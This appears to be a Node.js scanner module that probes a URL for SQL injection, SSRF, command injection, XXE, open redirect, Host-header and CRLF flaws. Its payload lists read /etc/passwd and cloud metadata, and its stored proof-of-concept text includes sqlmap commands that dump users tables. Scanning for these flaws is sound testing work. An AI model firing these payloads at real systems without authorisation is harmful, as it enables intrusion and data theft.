const axios = require('axios');
const { Vulnerability, Scan } = require('../models');
const { logger } = require('../utils/logger');

// ============================================================
// SQL INJECTION DETECTION
// ============================================================

const testSQLInjection = async (url, scanId) => {
  logger.info('Testing SQL Injection on: ' + url);
  
  const payloads = [
    { payload: "' OR '1'='1", type: 'boolean-true' },
    { payload: "' OR '1'='2", type: 'boolean-false' },
    { payload: "' AND SLEEP(3)--", type: 'time-based' },
    { payload: "' UNION SELECT NULL--", type: 'union' },
    { payload: "1' ORDER BY 1--", type: 'order' },
    { payload: "'; DROP TABLE users--", type: 'error' }
  ];
  
  const params = ['id', 'user', 'page', 'search', 'q', 'cat', 'item', 'product'];
  const baseUrl = url.replace(/\/$/, '');
  
  for (const param of params) {
    try {
      // Get baseline response
      const baselineUrl = baseUrl + '?' + param + '=1';
      const baseline = await axios.get(baselineUrl, { timeout: 5000, validateStatus: () => true });
      const baselineContent = baseline.data.toString();
      const baselineLength = baselineContent.length;
      const baselineStatus = baseline.status;
      
      for (const { payload, type } of payloads) {
        try {
          const testUrl = baseUrl + '?' + param + '=' + encodeURIComponent(payload);
          const startTime = Date.now();
          const response = await axios.get(testUrl, { timeout: 10000, validateStatus: () => true });
          const duration = Date.now() - startTime;
          const content = response.data.toString();
          
          // Check for SQL errors
          const sqlErrors = [
            'sql syntax', 'mysql', 'ORA-', 'postgresql', 'sqlite',
            'syntax error', 'unterminated', 'ODBC', 'SQL Server',
            'Warning: mysql', 'pg_query', 'Unclosed quotation'
          ];
          
          const hasSQLError = sqlErrors.some(e => content.toLowerCase().includes(e.toLowerCase()));
          
          // Time-based detection
          const isTimeInjection = type === 'time-based' && duration > 2500;
          
          // Boolean-based detection
          const booleanTrueUrl = baseUrl + '?' + param + '=' + encodeURIComponent("' OR '1'='1");
          const booleanFalseUrl = baseUrl + '?' + param + '=' + encodeURIComponent("' OR '1'='2");
          
          let booleanDiff = false;
          try {
            const boolTrueResp = await axios.get(booleanTrueUrl, { timeout: 5000, validateStatus: () => true });
            const boolFalseResp = await axios.get(booleanFalseUrl, { timeout: 5000, validateStatus: () => true });
            
            if (Math.abs(boolTrueResp.data.toString().length - boolFalseResp.data.toString().length) > 100) {
              booleanDiff = true;
            }
          } catch (e) {}
          
          if (hasSQLError || isTimeInjection || booleanDiff) {
            await createVuln(scanId, {
              title: 'SQL Injection Vulnerability',
              description: `Parameter '${param}' is vulnerable to SQL injection via ${type} technique. This can lead to complete database compromise.`,
              severity: 'critical',
              cvss: '9.8',
              cwe: 'CWE-89',
              url: testUrl,
              evidence: hasSQLError ? 'SQL error in response' : isTimeInjection ? `Time delay: ${duration}ms` : 'Boolean-based difference detected',
              solution: `Use parameterized queries or prepared statements. Never concatenate user input into SQL queries.

Example Fix (Node.js):
const query = 'SELECT * FROM users WHERE id = ?';
db.query(query, [userId]);

Example Fix (PHP):
$stmt = $pdo->prepare("SELECT * FROM users WHERE id = ?");
$stmt->execute([$_GET['id']]);`,
              poc: `## SQL Injection Proof of Concept

### Vulnerable URL:
${testUrl}

### Test Payload:
\`\`\`
${payload}
\`\`\`

### How to Test:
1. Open the URL in browser
2. If you see more data than expected or SQL errors, vulnerability exists

### Exploit with SQLMap:
\`\`\`bash
sqlmap -u "${testUrl}" --dbs
sqlmap -u "${testUrl}" -D database_name --tables
sqlmap -u "${testUrl}" -D database_name -T users --dump
\`\`\`

### Impact:
- Full database access
- Data theft
- Authentication bypass
- Potential RCE

### CWE: CWE-89 (SQL Injection)`,
              category: 'sql-injection'
            });
            break; // Found one, move to next param
          }
        } catch (e) {}
      }
    } catch (e) {}
  }
};

// ============================================================
// SSRF DETECTION
// ============================================================

const testSSRF = async (url, scanId) => {
  logger.info('Testing SSRF on: ' + url);
  
  const ssrfPayloads = [
    { payload: 'http://localhost', desc: 'Localhost access' },
    { payload: 'http://127.0.0.1', desc: 'Loopback access' },
    { payload: 'http://169.254.169.254/latest/meta-data/', desc: 'AWS metadata' },
    { payload: 'http://metadata.google.internal/', desc: 'GCP metadata' },
    { payload: 'file:///etc/passwd', desc: 'Local file read' },
    { payload: 'http://[::1]', desc: 'IPv6 localhost' }
  ];
  
  const params = ['url', 'uri', 'link', 'src', 'dest', 'path', 'page', 'file'];
  const baseUrl = url.replace(/\/$/, '');
  
  for (const param of params) {
    for (const { payload, desc } of ssrfPayloads) {
      try {
        const testUrl = baseUrl + '?' + param + '=' + encodeURIComponent(payload);
        const response = await axios.get(testUrl, { timeout: 5000, validateStatus: () => true });
        const content = response.data.toString();
        
        // Check for SSRF indicators
        const indicators = [
          'root:', 'daemon:', '/bin/bash',  // file read
          'ami-id', 'instance-id', 'meta-data',  // AWS metadata
          'computeMetadata', 'project-id'  // GCP metadata
        ];
        
        const hasSSRF = indicators.some(i => content.includes(i));
        
        if (hasSSRF) {
          await createVuln(scanId, {
            title: 'Server-Side Request Forgery (SSRF)',
            description: `Parameter '${param}' allows SSRF. Server can be tricked into making requests to internal resources.`,
            severity: 'critical',
            cvss: '9.1',
            cwe: 'CWE-918',
            url: testUrl,
            evidence: 'Internal resource accessed: ' + desc,
            solution: `Validate and whitelist URLs. Block access to internal IPs and cloud metadata.

Example Fix:
const url = new URL(userInput);
if (['localhost', '127.0.0.1', '169.254.169.254'].includes(url.hostname)) {
  throw new Error('Invalid URL');
}`,
            poc: `## SSRF Proof of Concept

### Vulnerable URL:
${testUrl}

### Payload:
\`\`\`
${payload}
\`\`\`

### Impact:
- Access internal services
- Cloud credential theft
- Internal network scanning
- Remote code execution

### CWE: CWE-918 (Server-Side Request Forgery)`,
            category: 'ssrf'
          });
          break;
        }
      } catch (e) {}
    }
  }
};

// ============================================================
// COMMAND INJECTION DETECTION
// ============================================================

const testCommandInjection = async (url, scanId) => {
  logger.info('Testing Command Injection on: ' + url);
  
  const cmdPayloads = [
    { payload: '; ls', desc: 'Command chaining' },
    { payload: '| whoami', desc: 'Pipe command' },
    { payload: '`id`', desc: 'Backtick execution' },
    { payload: '$(whoami)', desc: 'Subshell execution' },
    { payload: '; cat /etc/passwd', desc: 'File read' },
    { payload: '& ping -c 1 127.0.0.1 &' , desc: 'Background ping' }
  ];
  
  const params = ['cmd', 'exec', 'command', 'ping', 'host', 'ip', 'target'];
  const baseUrl = url.replace(/\/$/, '');
  
  // Get baseline
  let baselineContent = '';
  try {
    const baseline = await axios.get(baseUrl, { timeout: 5000, validateStatus: () => true });
    baselineContent = baseline.data.toString();
  } catch (e) {}
  
  for (const param of params) {
    for (const { payload, desc } of cmdPayloads) {
      try {
        const testUrl = baseUrl + '?' + param + '=' + encodeURIComponent(payload);
        const response = await axios.get(testUrl, { timeout: 5000, validateStatus: () => true });
        const content = response.data.toString();
        
        // Check for command output
        const cmdOutputs = [
          'uid=', 'gid=', 'groups=',  // id command
          'root:', 'daemon:', 'bin:',  // /etc/passwd
          'total', 'drwx', 'ls:',  // ls command
          'PING', 'bytes from', 'icmp_seq'  // ping command
        ];
        
        const hasCommandOutput = cmdOutputs.some(o => content.includes(o) && !baselineContent.includes(o));
        
        if (hasCommandOutput) {
          await createVuln(scanId, {
            title: 'Command Injection Vulnerability',
            description: `Parameter '${param}' allows OS command injection. Attacker can execute arbitrary commands on server.`,
            severity: 'critical',
            cvss: '9.8',
            cwe: 'CWE-78',
            url: testUrl,
            evidence: 'Command output detected in response: ' + desc,
            solution: `Never pass user input to shell commands. Use safe alternatives.

Example Fix (Node.js):
// WRONG
exec('ping ' + userInput);

// RIGHT
const { execFile } = require('child_process');
execFile('ping', ['-c', '1', userInput]);`,
            poc: `## Command Injection Proof of Concept

### Vulnerable URL:
${testUrl}

### Payload:
\`\`\`
${payload}
\`\`\`

### Impact:
- Full server compromise
- Data theft
- Ransomware deployment
- Lateral movement

### CWE: CWE-78 (OS Command Injection)`,
            category: 'command-injection'
          });
          break;
        }
      } catch (e) {}
    }
  }
};

// ============================================================
// OPEN REDIRECT DETECTION
// ============================================================

const testOpenRedirect = async (url, scanId) => {
  logger.info('Testing Open Redirect on: ' + url);
  
  const params = ['url', 'redirect', 'next', 'return', 'goto', 'dest', 'continue'];
  const payloads = [
    'https://evil.com',
    '//evil.com',
    '/\\evil.com',
    'https://evil.com%2F'
  ];
  
  const baseUrl = url.replace(/\/$/, '');
  
  for (const param of params) {
    for (const payload of payloads) {
      try {
        const testUrl = baseUrl + '?' + param + '=' + encodeURIComponent(payload);
        const response = await axios.get(testUrl, { 
          timeout: 5000, 
          validateStatus: () => true,
          maxRedirects: 0
        });
        
        const location = response.headers['location'] || '';
        
        if (location.includes('evil.com')) {
          await createVuln(scanId, {
            title: 'Open Redirect Vulnerability',
            description: `Parameter '${param}' allows redirect to arbitrary external URLs. Can be used for phishing attacks.`,
            severity: 'medium',
            cvss: '6.1',
            cwe: 'CWE-601',
            url: testUrl,
            evidence: 'Redirects to: ' + location,
            solution: 'Validate redirect URLs against whitelist of allowed domains.',
            poc: `## Open Redirect Proof of Concept

### Vulnerable URL:
${testUrl}

### Phishing Attack:
1. Attacker sends victim: ${testUrl}
2. User redirected to evil.com
3. Phishing page steals credentials

### CWE: CWE-601 (Open Redirect)`,
            category: 'open-redirect'
          });
          break;
        }
      } catch (e) {}
    }
  }
};

// ============================================================
// XXE DETECTION
// ============================================================

const testXXE = async (url, scanId) => {
  logger.info('Testing XXE on: ' + url);
  
  const xxePayload = `<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>`;
  
  const xmlPaths = ['/api/xml', '/xml', '/soap', '/api/soap', '/feed', '/rss'];
  const baseUrl = url.replace(/\/$/, '');
  
  for (const path of xmlPaths) {
    try {
      const testUrl = baseUrl + path;
      const response = await axios.post(testUrl, xxePayload, {
        headers: { 'Content-Type': 'application/xml' },
        timeout: 5000,
        validateStatus: () => true
      });
      
      const content = response.data.toString();
      
      if (content.includes('root:') || content.includes('/bin/')) {
        await createVuln(scanId, {
          title: 'XML External Entity (XXE) Vulnerability',
          description: 'Server processes external entities in XML input. Can lead to file read and SSRF.',
          severity: 'critical',
          cvss: '9.1',
          cwe: 'CWE-611',
          url: testUrl,
          evidence: 'File content leaked in response',
          solution: 'Disable external entity processing in XML parser.',
          poc: `## XXE Proof of Concept

### Vulnerable URL:
${testUrl}

### Payload:
\`\`\`xml
${xxePayload}
\`\`\`

### CWE: CWE-611 (XXE)`,
          category: 'xxe'
        });
        break;
      }
    } catch (e) {}
  }
};

// ============================================================
// HOST HEADER INJECTION
// ============================================================

const testHostHeaderInjection = async (url, scanId) => {
  logger.info('Testing Host Header Injection on: ' + url);
  
  const maliciousHosts = ['evil.com', 'localhost', '127.0.0.1'];
  const baseUrl = url.replace(/\/$/, '');
  
  for (const host of maliciousHosts) {
    try {
      const response = await axios.get(baseUrl, {
        headers: { 'Host': host },
        timeout: 5000,
        validateStatus: () => true
      });
      
      const content = response.data.toString();
      
      // If our injected host appears in response (links, redirects, etc.)
      if (content.includes(host)) {
        await createVuln(scanId, {
          title: 'Host Header Injection',
          description: 'Server trusts user-supplied Host header. Can lead to cache poisoning and password reset poisoning.',
          severity: 'medium',
          cvss: '5.4',
          cwe: 'CWE-644',
          url: baseUrl,
          evidence: 'Injected host reflected in response',
          solution: 'Validate Host header against allowed domains.',
          poc: `## Host Header Injection

### Test:
\`\`\`bash
curl -H "Host: evil.com" ${baseUrl}
\`\`\`

### CWE: CWE-644`,
          category: 'host-header'
        });
        break;
      }
    } catch (e) {}
  }
};

// ============================================================
// CRLF INJECTION
// ============================================================

const testCRLFInjection = async (url, scanId) => {
  logger.info('Testing CRLF Injection on: ' + url);
  
  const crlfPayloads = [
    '%0d%0aX-Injected:%20true',
    '%0d%0aSet-Cookie:%20injected=true',
    '%0d%0a%0d%0a<script>alert(1)</script>'
  ];
  
  const params = ['url', 'page', 'redirect'];
  const baseUrl = url.replace(/\/$/, '');
  
  for (const param of params) {
    for (const payload of crlfPayloads) {
      try {
        const testUrl = baseUrl + '?' + param + '=' + payload;
        const response = await axios.get(testUrl, { timeout: 5000, validateStatus: () => true });
        
        const headers = response.headers;
        
        if (headers['x-injected'] || headers['set-cookie']?.includes('injected')) {
          await createVuln(scanId, {
            title: 'CRLF Injection Vulnerability',
            description: 'Server allows injection of CRLF characters. Can lead to response splitting and cache poisoning.',
            severity: 'medium',
            cvss: '5.4',
            cwe: 'CWE-113',
            url: testUrl,
            evidence: 'CRLF injection successful',
            solution: 'Sanitize input to remove CRLF characters.',
            poc: `## CRLF Injection

### CWE: CWE-113`,
            category: 'crlf'
          });
          break;
        }
      } catch (e) {}
    }
  }
};

// Helper function
const createVuln = async (scanId, data) => {
  try {
    await Vulnerability.create({
      scanId,
      title: data.title,
      description: data.description,
      severity: data.severity,
      cvssScore: data.cvss,
      cveId: data.cwe,
      url: data.url,
      evidence: data.evidence,
      solution: data.solution,
      poc: data.poc,
      pocType: 'markdown',
      status: 'open',
      category: data.category,
      confirmed: true
    });
    logger.info('Created: ' + data.title);
  } catch (error) {
    logger.error('Failed to create vulnerability: ' + error.message);
  }
};

module.exports = {
  testSQLInjection,
  testSSRF,
  testCommandInjection,
  testOpenRedirect,
  testXXE,
  testHostHeaderInjection,
  testCRLFInjection
};
